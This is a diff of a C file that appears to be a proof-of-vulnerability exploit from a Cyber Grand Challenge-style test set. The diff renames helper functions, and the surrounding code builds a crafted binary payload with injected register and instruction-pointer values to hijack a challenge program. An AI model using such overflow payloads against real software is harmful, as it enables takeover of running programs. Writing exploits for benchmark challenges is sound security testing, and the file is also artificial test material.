@@ -2,9 +2,9 @@
 #include <string.h>
 
 // STOLEN FROM CROMU sample
-// __itoa - Does not check output buffer size.
-// Can potentially __write up to 12 characters ("-2147483648\0") to str.
-void __itoa(char *str, int i)
+// itoa - Does not check output buffer size.
+// Can potentially write up to 12 characters ("-2147483648\0") to str.
+void itoa(char *str, int i)
 {
     char buffer[11];
     int pos = 0;
@@ -61,13 +61,13 @@ int main(void)
         }
         buf[0] = 'q';
         buf[1] = NL[0];
-        __itoa(&buf[2], i);
-        buf[__strlen(buf)] = NL[0];
-        buf[__strlen(buf)] = '\0';
-        transmit_all(STDOUT, buf, __strlen(buf));
+        itoa(&buf[2], i);
+        buf[strlen(buf)] = NL[0];
+        buf[strlen(buf)] = '\0';
+        transmit_all(STDOUT, buf, strlen(buf));
     }
 
-    __memcpy(buf, "XX\x02""512 aaaabbbbxxxxxxxxxxxxxxxx\x21\x00\x04\x00\x3c\xa8\xaa\xba\x3c\x00\xc0\xb7\x02""512\x02""111\x02", 52);
+    memcpy(buf, "XX\x02""512 aaaabbbbxxxxxxxxxxxxxxxx\x21\x00\x04\x00\x3c\xa8\xaa\xba\x3c\x00\xc0\xb7\x02""512\x02""111\x02", 52);
     *(unsigned int *)&buf[7] = t1.regval;
     *(unsigned int *)&buf[11] = t1.ipval;
     random(&buf[0], 2, &bytes);
